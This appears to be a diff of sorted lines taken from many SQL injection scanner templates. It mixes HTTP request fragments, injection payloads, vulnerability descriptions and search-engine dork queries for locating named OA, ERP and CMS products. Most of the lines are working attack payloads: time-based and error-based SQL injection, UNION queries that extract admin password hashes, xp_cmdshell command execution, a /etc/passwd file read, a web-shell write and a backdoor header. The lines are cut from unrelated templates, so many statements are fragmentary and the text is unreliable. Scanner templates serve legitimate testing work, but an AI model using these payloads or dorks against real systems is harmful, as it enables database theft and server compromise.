+GET /{{database}}/information_schema".tables)s%20where%201=version()::int--/auth HTTP/1.1
+Host: '{{Hostname}}'
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR\"*/
+If-Match: "' or sleep(30)='"
+If-Modified-Since: "' or sleep(30)='"
+If-None-Match: "' or sleep(30)='"
+If-Range: "' or sleep(30)='"
+If-Unmodified-Since: "' or sleep(30)='"
+Implement input validation and use parameterized queries to prevent SQL Injection attacks.
+Implement strict input validation to ensure only expected and safe data is processed by the application.
+Joomla! `com_departments` parameter contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','{{num}}')))) AND 'CvNI'='CvNI
+LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--%20-&limit=1&style=1&view=articles&format=raw&Itemid=13'
+Loan Management System 1.0 contains a SQL injection vulnerability via the username parameter. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+Mall Advanced Real Estate Script 4.0.7版本中存在SQL注入漏洞。远程攻击者可通过向search-results.php文件发送‘Projectmain’、‘proj_type’、‘searchtext’、‘sell_price’或‘maxprice’参数利用该漏洞注入SQL命令。 "
+Max-Forwards: "' or sleep(30)='"
+Mingyuanyun ERP's `VistorWeb_XMLHTTP.aspx` endpoint has a SQL time-based blind injection vulnerability that allows attackers to execute arbitrary SQL commands.
+Opencart allows SQL Injection via parameter 'search' in /index.php?route=product/search&search=. Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+Origin: "' or sleep(30)='"
+PMB is a completely free ILS (Integrated Library management System). The domain of software for libraries is almost exclusively occupied by proprietary products. We are some librarians, users and developers deploring this state of affairs.
+POST /admin/page/system/link_edit.php?id=1%20and%20if(1,sleep(3),1) HTTP/1.1
+POST /admin/page/user/notice_edit.php?id=1%20and%20if(1,sleep(3),1) HTTP/1.1
+POST /ajax.php?do=inforum&listforumid=(select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'"%2B(select(0)from(select(sleep(6)))v)%2B"*/&result=10 HTTP/1.1
+POST /portal/pt/servlet/pagesServlet/doPost?pageId=login&pk_group=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+Pragma: "' or sleep(30)='"
+Proxy-Authorization: "' or sleep(30)='"
+Range: "' or sleep(30)='"
+Referer: "%';SELECT PG_SLEEP(5)--"
+Referer: "' WAITFOR DELAY '0:0:5'--"
+Referer: "' or sleep(30)='"
+Referer: "'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z"
+Referer: "'| |pg_sleep(5)--"
+Referer: "(select(0)from(select(sleep(5)))v)/*%27+(select(3)from(select(sleep(5)))v)+%27%22+(select(0)from(select(sleep(5)))v)+\"*/"
+Referer: "-1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'"
+Referer: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='"
+Referer: "1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-1337"
+Referer: "1 or sleep(5)#"
+Referer: "1'XOR(if(now()=sysdate(),sleep(5),0))OR'"
+Referer: "XOR(if(now()=sysdate(),sleep(5),0))OR'"
+Referer: "if(now()=sysdate(),sleep(5),0)"
+Referer: "pg_sleep(5)"
+Referer: "{{BaseURL}}/royal_event/btndates_report.php#?="
+Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}
+SELECT 'malicious code' INTO OUTFILE '/var/www/html/shell.php';
+SELECT * FROM shell;
+SELECT @@VERSION, SUSER_SNAME(), DB_NAME();
+SELECT @@VERSION, USER(), DATABASE();
+SELECT CONCAT('a', 'b');
+SELECT LOAD_FILE('/etc/passwd');
+SELECT banner FROM v$version;
+SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';
+SELECT column_name FROM information_schema.columns WHERE table_name = 'users';
+SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users');
+SELECT name FROM sysobjects WHERE xtype = 'U';
+SELECT pg_sleep(5);
+SELECT table_name FROM all_tables;
+SELECT table_name FROM information_schema.tables;
+SELECT tablename FROM pg_catalog.pg_tables WHERE schemaname = 'public';
+SELECT user FROM dual;
+SELECT version(), current_user, current_database();
+SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/
+SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/
+SLEEP(5)
+SLEEP(5) /*' or SLEEP(5) or '" or SLEEP(5) or "*/
+SOAPAction: "http://tempuri.org/GetOAById"
+SOAPAction: "http://tempuri.org/ioffice/udfmr/GetEmpSearch"
+SQL Injection is a type of SQL injection attack in which an attacker can exploit a vulnerability in a web application's input fields to manipulate the application's SQL queries.
+Scripts Mall Advanced Real Estate Script 4.0.7版本中存在SQL注入漏洞。远程攻击者可通过向locat.php参数利用该漏洞注入SQL命令。 "
+Scripts Mall Advanced Real Estate Script 4.0.7版本中存在SQL注入漏洞。远程攻击者可通过向state.php参数利用该漏洞注入SQL命令。 "
+Sec-Ch-Ua-Platform: "macOS"
+Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
+Soapaction: ""
+Soapaction: "http://tempuri.org/GetLoginedEmpNoReadedInf"
+System: 1' AND 1156 IN (SELECT '{{str1}}' + '1' + '{{str2}}')--
+TE: "' or sleep(30)='"
+The NC-Cloud system's show_download_content interface has a SQL injection vulnerability, which allows attackers to manipulate the database through maliciously constructed SQL statements, resulting in data leaks, tampering or destruction, and seriously threatening system security.
+The Wanhu OA DocumentEdit.jsp file has a SQL injection vulnerability. An attacker can perform SQL injection into the database by sending a special request package and obtain sensitive information on the server.
+The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action (available to unauthenticated users), leading to an SQL injection.
+The plugin does not validate and escape the id parameter in its notificationx/v1/notification REST endpoint before using it in a SQL statement, which could allow unauthenticated attackers to perform SQL Injection attacks.
+There is a SQL injection vulnerability in the GetAllRechargeRecordsBySIMCardId interface of Pingsheng Electronics Reservoir Supervision Platform. An attacker can access the data in the database without authorization, thereby stealing user data and leaking user information.
+There is an SQL injection vulnerability in the getFaceCapture interface of Dahua Smart Park Comprehensive Management Platform, which allows attackers to execute arbitrary SQL statements and obtain sensitive database information through the vulnerability
+This is accomplished by the application taking user input and combining it with static parameters to build an SQL query .
+This template detects SQL Injection vulnerabilities in the "Forgot Password" functionality in essl-time-trackLite-server by looking for SQL error messages in the response.
+Tongda OA v11.6 report_bi.func.php has a SQL injection vulnerability, and attackers can obtain database information through the vulnerability.
+UFIDA U8-CRM system /config/fillbacksetting.php contains an SQL injection vulnerability, which allows attackers to manipulate the database through maliciously constructed SQL statements, resulting in data leaks, tampering or destruction, and seriously threatening system security.
+UNION SELECT md5(3.1415),2,3'
+USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5 whe\re 1={`\='` 1} un\ion (s\elect user(),database() fr\om user whe\re 1\={`=` 1})-- '
+UniNXG Security Data Exchange System's `queryLinklnfo` endpoint has an SQL injection vulnerability that allows attackers to execute arbitrary SQL commands. Unauthenticated attackers can exploit this vulnerability to retrieve database user data.
+Upgrade: "' or sleep(30)='"
+User-Agent: "%';SELECT PG_SLEEP(5)--"
+User-Agent: "' WAITFOR DELAY '0:0:5'--"
+User-Agent: "' or sleep(30)='"
+User-Agent: "'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z"
+User-Agent: "'| |pg_sleep(5)--"
+User-Agent: "(select(0)from(select(sleep(5)))v)/*%27+(select(3)from(select(sleep(5)))v)+%27%22+(select(0)from(select(sleep(5)))v)+ \"*/"
+User-Agent: "-1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'"
+User-Agent: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='"
+User-Agent: "1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-1337"
+User-Agent: "1 or sleep(5)#"
+User-Agent: "1'XOR(if(now()=sysdate(),sleep(5),0))OR'"
+User-Agent: "XOR(if(now()=sysdate(),sleep(5),0))OR'"
+User-Agent: "if(now()=sysdate(),sleep(5),0)"
+User-Agent: "pg_sleep(5)"
+User-Agentt: zerodiumsystem('id');
+Via: "' or sleep(30)='"
+WAITFOR DELAY '0:0:5';
+Warning: "' or sleep(30)='"
+We recommend that you update to the latest version 5.4 or above.
+WordPress IP-Logger plugin  3.0 and earlier 存在sql注入漏洞，问题出在/wp-content/plugins/ip-logger/map-details.php的lat参数上。
+WordPress Plugin Community Events 'id'参数SQL注入漏洞
+WordPress Plugin Media Library Categories  'termid'参数SQL注入漏洞
+X-Client-IP: "' or sleep(30)='"
+X-Forwarded-For: "%';SELECT PG_SLEEP(5)--"
+X-Forwarded-For: "' WAITFOR DELAY '0:0:5'--"
+X-Forwarded-For: "' or sleep(30)='"
+X-Forwarded-For: "'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z"
+X-Forwarded-For: "'| |pg_sleep(5)--"
+X-Forwarded-For: "(select(0)from(select(sleep(5)))v)/*' +(select(3)from(select(sleep(5)))v)+ '\" +(select(0)from(select(sleep(5)))v)+ \"*/"
+X-Forwarded-For: "-1/**/oR/**/1=1 1/**/aND/**/1=1 -1`oR`1`=`1 1`aND`1`=`1 or 1 like '%1'"
+X-Forwarded-For: "1 AND (SELECT * FROM (SELECT(SLEEP(5)))YYYY) AND '%'='"
+X-Forwarded-For: "1 AND (SELECT 1337 FROM (SELECT(SLEEP(5)))YYYY)-1337"
+X-Forwarded-For: "1 or sleep(5)#"
+X-Forwarded-For: "1'XOR(if(now()=sysdate(),sleep(5),0))OR'"
+X-Forwarded-For: "XOR(if(now()=sysdate(),sleep(5),0))OR'"
+X-Forwarded-For: "if(now()=sysdate(),sleep(5),0)"
+X-Forwarded-For: "pg_sleep(5)"
+X-Forwarded-For: 1.1.1.1',(select 1 from (select count(*),concat((Select concat(md5(3.14))),floor(rand(0)*2))x from information_schema.tables group by x)a),1,1)#
+X-Forwarded-For: 127.0.0.1','1','1'),('1','a','a',(select md5(123456)),'a','a','0','1381393437','127.0.0.1
+X-Forwarded-Host: "' or sleep(30)='"
+X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert(md5({{r1}}),1,1,0x7e),1) and '";|45ea207d7a2b68c49582d2d22adf953a
+X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert({{randstr}},1,1,0x7e),1)
+X-Host: "' or sleep(30)='"
+X-Originating-IP: "' or sleep(30)='"
+X-Remote-Addr: "' or sleep(30)='"
+X-Remote-IP: "' or sleep(30)='"
+Yonyou KSOA contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+Zoo Management System 1.0 contains a SQL injection vulnerability via the username parameter on the login page. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+\"
+_POST[dataset_id]=efgh'-@`'`)union+select+database(),2,user()#'&action=get_link_info&
+_SERVER=&rid=1'
+_SERVER=&rid=exp(~(select*from(select concat(0x7e7e7e,md5(123),0x7e7e7e) from user limit 0,1)x))
+_SESSION[member_purview]=&_SESSION[member_user]=tomato&_SESSION[member_login]=true&_SESSION[member_id]=updatexml(1,concat((Select group_concat(md5(1)) from bees_admin)),1)&submit=xxxx
+_SESSION[member_purview]=1 and updatexml(1,concat(0x26,(select md5(233)),0x26),1)#&_SESSION[member_user]=tomato&_SESSION[member_login]=true&_SESSION[member_id]=1
+__parameters__={"LABEL1":"TYPE:","TYPE":"10/case when substr(user(),1,1)='!' then 1 else 0 end","LABEL3":"START_TIME:","START_TIME":"2023-08-01 00:00","LABEL5":"END_TIME:","END_TIME":"2023-08-01 22:21","LABEL7":"LIMIT:","LIMIT":1000}
+accId=lCUnZcAO';%20waitfor%20delay%20'0:0:6'%20--%20&loginCode=e&password=&type=
+ad_user=%27+or+%28select+sleep%28"""+str(5)+"""%29%29%3D1%23&ad_psw=123&ad_psw2=123"""
+admin' #
+admin'--
+admin'/*
+and '";|45ea207d7a2b68c49582d2d22adf953a
+app="泛微-协同商务系统"
+articleid: search["articleid"]
+author: '0x404'
+author: Zero Trust Security Attack and Defense Laboratory
+body: "cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,user()#"
+body: "key=readimage&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1"
+body: "{\"mids\":{\"1 ,:mid_1);select '{{payload}}' -- aa\":\"\",\"1\":1}}"
+body: "{\"params\": {\"a\": \"11\"}, \"sql\": \"select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','qaxnb'))\"}"
+body: '{{url_encode(''selectedCategory'': ''0 UNION SELECT md5(1),2,3,4,5,6'',''action'':
+body: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]><xml><ToUserName>&test;</ToUserName><FromUserName>1111</FromUserName><MsgType>123</MsgType><FuncFlag>3</FuncFlag><Content>1%' union select md5({{rand}})#</Content></xml>
+body: act=op&chk[0]=1 or updatexml(1,md5(123),1)#
+body: act=op&chk[0]=1) or updatexml(1,md5(123),1)#
+body: action=&result=1&id=1 and extractvalue(1,concat(0x7e,(md5(123))))#
+body: action=111&id=updatexml(1,concat(0x5c,md5(3.14)),1)
+body: action=a&result=1&id=1%20or%20updatexml(1,concat(0x5c,md5(3.14)),1)
+body: appno= 1 union SELECT {{r1}}*{{r2}},1&editor=cn&site=web
+body: cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA
+body: id=0||(updatexml(1,concat(0x7e,(select%20md5({{r1}})),0x7e),1))
+body: image_id=19%20AND%20(SELECT%206173%20FROM(SELECT%20COUNT(*),CONCAT(0x716b627871,(MID((IFNULL(CAST(MD5(1)%20AS%20CHAR),0x20)),1,50)),0x716a6a7171,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)&rate=&ajax_task=save_hit_count&task=gallerybox.ajax_search
+body: pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,(select md5({{rand}}))),0)%23]=bob&name[0]=a
+body: result=50&id=updatexml(1,concat(0x5c,md5(3.14)),1)&act=edit
+calendarId=1)+AND+(SELECT+2065+FROM+(SELECT(SLEEP(6)))jtGw)+AND+(5440=5440&from=2010-05-05&to=2010-05-09&action=abc_booking_getBookingResult
+captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='
+cc_parent_id=-999 /*!50000union*/ /*!50000select*/ 1,user()#
+char(0x27)char(0x27)
+chk[]=1%20and%201=updatexml(1,concat(0x5c,(select md5(1))),1)&act=op
+cid=1*if(now()=sysdate()%2Csleep(6)%2C0)&max_price=124&minimum_range=0&sort=112
+cmd=saveData&edited=%5B%7B%22id%22%3A%22+1%29+union+select+sleep%287%29%2C2%3B+--+%22%7D%5D
+colid=3&f=hits'&itemid=6&type=0
+command=delNotice&noticeId=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--
+command=delNotice&noticeId=123';if+(select+IS_SRVROLEMEMBER('sysadmin'))=1+WAITFOR+DELAY+'0:0:5'--
+command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--
+command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin')=1) WAITFOR DELAY '0:0:5'--
+constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND'AAdm'='AAdm&title=%40127.0.0.1
+contacts[contentl`) VALUES ( updatexml(1,concat(0x7e,(SELECT/**/md5(123)),0x7e),1) );-- a]=111&mobile=111&content=111
+count(*),concat((select(select concat(MD5(3.14),0x27,0x7e)) FROM information_schema.tables
+database: "{{database}}"
+description: "Advanced Real Estate Script 4.0.6 - locat.php存在SQL注入漏洞\n PHP Scripts
+description: "Advanced Real Estate Script 4.0.6 - state.php存在SQL 注入漏洞\n PHP Scripts
+description: "Advanced Real Estate Script 4.0.6存在SQL 注入漏洞\n PHP Scripts Mall Advanced
+description: "Arcms-json_newslist-存在SQL注入漏洞\n arcms是一套基于layui和arphp的内容管理系统。\n\narcms
+description: 74cms 5.0.1 前台AjaxPersonalController.class.php存在SQL注入漏洞 app="骑士-74CMS"
+description: 74cms-sqli-1 app="骑士-74CMS"
+description: 74cms-sqli-2 app="骑士-74CMS"
+description: A vulnerability in Ecshop allows remote unauthenticated users to inject arbitrary SQL statements into via the 'Referer' header field.
+description: A vulnerability in the DedeCMS product allows remote unauthenticated users to inject arbitrary SQL statements via the 'ajax_membergroup.php' endpoint and the 'membergroup' parameter.
+description: An SQL injection vulnerability in KeyInfoList.aspx allows attackers to execute arbitrary SQL commands through the 'zt' parameter.
+description: Chenxin Lingchuang and Chenxin Jingyun Terminal Security Management System login has a SQL injection vulnerability, through which attackers can obtain sensitive information from the database.
+description: Dotnet CMS contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+description: Due to using string concatenation, allowing direct access to a vulnerable PHP file and missing best-practices for coding SQL operations, there exists an unauthenticated SQL injection in autocompletion-PHP5.5.php.
+description: Ecology 8 contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+description: Ecology Syncuserinfo contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+description: PHPOK contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+description: Royal Event Management System 1.0 allows SQL Injection via parameter 'todate' in /royal_event/btndates_report.php#?=. Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+description: SeaCMS 8.7 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+description: The application suffers from an unauthenticated SQL Injection vulnerability. Input passed through 'input_id' POST parameter in '/http/index.php' is not properly sanitised before being returned to the
+description: The application suffers from an unauthenticated SQL Injection vulnerability. Input passed through 'input_id' POST parameter in '/http/index.php' is not properly sanitised before being returned to the user or used in SQL queries.
+description: The plugin does not sanitise and escape a parameter before using it in a SQL statement via an AJAX action (available to unauthenticated users), leading to an SQL injection.
+description: Yonyou U8 contains a SQL injection vulnerability. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.
+description: 泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限 app="泛微-协同办公OA"
+description: 泛微OA e-cology syncuserinfo SQL注入漏洞 app="Weaver-OA"
+description: 泛微OA e-cology validate SQL注入漏洞 app="Weaver-OA"
+description: 蓝凌EIS体验系统用户信息  ShowUserInfo.aspx页面存在 sql 注入  fofa="/scripts/jquery.landray.common.js"
+email=" AND (SELECT 3472 FROM (SELECT(SLEEP(6)))UTQK)-- IGIe&submit_reset_pwd=
+email="+AND+(SELECT+3472+FROM+(SELECT(SLEEP(6)))UTQK)--+IGIe&submit_reset_pwd=
+employeeCode=1'-1/user--'&EncryptData=1
+exe_sql=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(107)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (2867=2867) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(98)||CHR(118)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL)&pageNumber=1&pageSize=10&exe_param=11,1,11,1,11,1
+exec master..xp_cmdshell 'ipconfig'
+exec master..xp_cmdshell 'ver'
+expression: 'response.status == 200 && response.body.bcontains(b"81dc9bdb52d04dc20036dbd8313ed055") && response.body.bcontains(b"Discuz! info</b>: MySQL Query Error")'
+expression: response.body.bcontains(b"cf79ae6addba60ad018347359bd144d2")
+expression: response.body.bcontains(b"ef775988943825d2871e1cfa75473ec")
+expression: response.body.bcontains(b"fc9bdfb86bae5c322bae5acd78760935")
+expression: response.status == 200 && response.body.bcontains(b"6f7c6dcbc380aac3bcba1f9fccec99")
+expression: response.status == 200 && response.body.bcontains(b"6f7c6dcbc380aac3bcba1f9fccec991e")
+expression: response.status == 200 && response.body.bcontains(b"81dc9bdb52d04dc20036dbd8313ed05") && response.body.bcontains(b"sql_error:MySQL Query Error")
+expression: response.status == 200 && response.body.bcontains(b"c4ca4238a0b923820dcc509a6f75849b")
+expression: response.status == 200 && response.body.bcontains(b'"SQL_EXISTS')
+expression: response.status == 200 && response.body.bcontains(bytes("~" + string(r1) + "~"))
+expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rand)))) && response.body.bcontains(b"dataexists")
+fileId=1';WAITFOR DELAY '0:0:4'--+&pis=1
+fileid=2+WAITFOR DELAY+'0:0:5'&isFromOutImg=1
+fileid={{num}}+AND+(SELECT+6196+FROM+(SELECT(SLEEP(5)))ovuM)#+xrbN&isFromOutImg=1
+fileid={{num}}+WAITFOR DELAY+'0:0:5'&isFromOutImg=1
+filename: "{{rand_base(5)}}.php"
+filename: "{{to_lower(rand_base(5))}}"
+fofa-qeury: 'PM2项目管理系统BS版增强工具.zip'
+fofa-qeury: app="用友-时空KSOA"
+fofa-qeury: title="AVCON-系统管理平台"
+fofa-query : title="iOffice.net"
+fofa-query: "Azon Dominator"
+fofa-query: "Login - Cloudlog"
+fofa-query: "Office Anywhere 2013"
+fofa-query: "app=\"华天动力-OA8000\""
+fofa-query: "js/PSExtend.js"
+fofa-query: 'app="HJSOFT-HCM"'
+fofa-query: 'app="TDXK-通达OA"'
+fofa-query: 'app="亿赛通-DLP"'
+fofa-query: 'app="亿赛通-电子文档安全管理系统"'
+fofa-query: 'app="泛微-OA（e-cology）"'
+fofa-query: 'app="用友-U8-Cloud"'
+fofa-query: 'app="用友-UFIDA-NC"'
+fofa-query: 'app="用友-时空KSOA"'
+fofa-query: 'app="畅捷通-TPlus"'
+fofa-query: 'app="金和网络-金和OA"'
+fofa-query: 'app="飞企互联-FE企业运营管理平台"'
+fofa-query: 'body="AjaxMethods.asmx/GetCompanyItem"'
+fofa-query: 'body="eoffice10" && body="eoffice_loading_tip"'
+fofa-query: 'body="深圳市联软科技股份有限公司"'
+fofa-query: 'title="YONYOU NC"'
+fofa-query: (app="红帆-ioffice" || app="红帆-HFOffice")
+fofa-query: app="ASPCMS"
+fofa-query: app="CmsEasy"
+fofa-query: app="HJSOFT-HCM"
+fofa-query: app="Landray-EIS智慧协同平台","/scripts/jquery.landray.common.js"
+fofa-query: app="Landray-OA系统"
+fofa-query: app="REALOR-天翼应用虚拟化系统"
+fofa-query: app="TDXK-通达OA"
+fofa-query: app="Weaver-OA"
+fofa-query: app="dahua-智慧园区综合管理平台"
+fofa-query: app="ezOFFICE协同管理平台"
+fofa-query: app="phpok"
+fofa-query: app="万户ezOFFICE协同管理平台"
+fofa-query: app="万户网络-ezOFFICE"
+fofa-query: app="华天动力-OA8000"
+fofa-query: app="帆软-FineReport"
+fofa-query: app="明源云-ERP"
+fofa-query: app="泛微-EOffice"
+fofa-query: app="泛微-云桥e-Bridge"
+fofa-query: app="泛微-协同办公OA"
+fofa-query: app="用友-NC-Cloud"
+fofa-query: app="用友-U8-Cloud"
+fofa-query: app="用友-UFIDA-NC"
+fofa-query: app="用友-时空KSOA"
+fofa-query: app="畅捷通-TPlus"
+fofa-query: app="红帆-ioffice"
+fofa-query: app="致翔软件-致翔OA"
+fofa-query: app="金和网络-金和OA"
+fofa-query: app="铭飞/MCMS"
+fofa-query: app="飞企互联-FE企业运营管理平台"
+fofa-query: app="骑士-74CMS"
+fofa-query: banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
+fofa-query: banner="Services/Identification/login.ashx"
+fofa-query: body="/Services/Identification/"
+fofa-query: body="/jsoa/login.jsp"
+fofa-query: body="/pf/portal/login/css/fonts/style.css"
+fofa-query: body="/seller.php?s=/Public/login"
+fofa-query: body="<meta http-equiv=\"refresh\" content=\"1;url='/admin'\"></span>" || body="dahuaDefined/headCommon.js" || title=="DSS"
+fofa-query: body="CheckSilverlightInstalled"
+fofa-query: body="Quick.Cms v6.7"
+fofa-query: body="jeeplus.js" && body="/static/common/"
+fofa-query: body="li_plugins_download"
+fofa-query: body="yyoa" && app="致远互联-OA"
+fofa-query: body="企业流程化管控系统"
+fofa-query: body="全程云办公" && body="/OA/WebResource.axd"
+fofa-query: body="远程通CHANJET_Remote"
+fofa-query: cert.subject="Baolei"
+fofa-query: icon_hash="-1443008128"
+fofa-query: icon_hash="-1700598274"
+fofa-query: icon_hash="-299520369"
+fofa-query: icon_hash="-58141038"
+fofa-query: icon_hash="-638292089"
+fofa-query: icon_hash="-682445886"
+fofa-query: icon_hash="1085941792"
+fofa-query: icon_hash="1085941792" && body="/logo/images/logo.gif"
+fofa-query: icon_hash="1085941792" || app="用友-UFIDA-NC"
+fofa-query: icon_hash="1464851260"
+fofa-query: icon_hash="413602919"
+fofa-query: product="顶讯科技-易宝OA系统"
+fofa-query: title="Fumeng Cloud"
+fofa-query: title="office Anywhere" && icon_hash="-759108386" && "2013"
+fofa-query: title="人力资源信息管理系统"
+fofa-query: title="人力资源信息管理系统",app="HJSOFT-HCM"
+fofa-query: title="孚盟云 "
+fofa-query: title="用友U8CRM"
+fofa-query: title="电子文档安全管理系统",body="CDGServer3/"
+fofa-query: title="金和协同管理平台"
+fofa: app="泛微-E-Weaver"
+fofa: app="用友-GRP-U8"
+fofa: body="/Services/Identification/"
+fofa: body="https://bladex.vip"
+fofa_query: app="海洋CMS"
+form_id=5&fields%5Busername%29+value+%281%2C%23%5D%5B%5D=1&feed_code=7d81&submit=1"""
+form_id=5&fields[username) value (1,1 or 1%3dextractvalue(1,concat(0x5c, (select concat(md5(1),0x5c,admin_password) from `bees_admin`))) )%23][]=1&feed_code=6a3d&submit=1
+form_id=5&fields[username) value (1,1 or updatexml(1,concat(0x7e,(select md5(123))),0) or\'\' )-- ][]=1&feed_code=7d81&submit=1
+format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA
+format="text">exec xp_cmdshell "set/A {{randomValue}}"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+from met_admin_table limit 1),2,3,4,5,6,1111,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23/aa'
+google-query: "Castel Digital"
+google-query: intext:"Developed by Phuket Solution"
+google-query: intext:"Kodlama:Erensoft"
+google-query: intext:"Power BY applezeed.com"
+google-query: inurl:"opac_css"
+group by a)b where @`''`'
+hunter-query: "欢迎使用任我行CRM"
+hunter-query: app.name="REALOR 瑞友天翼虚拟化平台"
+hunter-query: app.name="万户 ezEip"
+hunter-query: app.name="畅捷通 T+"
+hunter-query: app.name="通达 OA"
+hunter-query: app="辰信领创-景云终端安全管理系统"
+hunter-query: favicon:"210a3c89d4ab5effa18d6dd7a9627376" AND web.title:"IP-guard"
+hunter-query: product.name="泛微 e-cology 9.0 OA"
+hunter-query: web.body="/Services/Identification/"
+hunter-query: web.body="/WPMS/asset/lib/json2.js"
+hunter-query: web.body="<meta http-equiv=\"refresh\" content=\"1;url='/admin'\"></span>"||web.body="dahuaDefined/headCommon.js"||title=="DSS"
+hunter-query: web.icon=="2464cbce5dd2681dd4fb62d055520d78"
+hunter-query: web.title="电子文档安全管理系统",web.body="CDGServer3/"
+id=0 UNION SELECT 1,2,3,4,5,6,md5(1),md5(1),md5(1),10,11,12 FROM wp_terms WHERE term_id=1
+if(now()=sysdate(),sleep(9),0)/*'XOR(if(now()=sysdate(),sleep(9),0))OR'\"XOR(if(now()=sysdate(),sleep(9),0))OR\"*/
+isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:15'
+isFromOutImg=1&fileid=%d+WAITFOR+DELAY+'0:0:7'
+key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
+key=readClob&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=11' and CONVERT(int,(select%20sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27{{num}}%27))))=1 and ''='
+key=xxx' AND (SELECT 7359 FROM(SELECT COUNT(*),CONCAT(0x7e,(MID((IFNULL(CAST(md5(1) AS CHAR),0x20)),1,50)),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'xx'='xx"
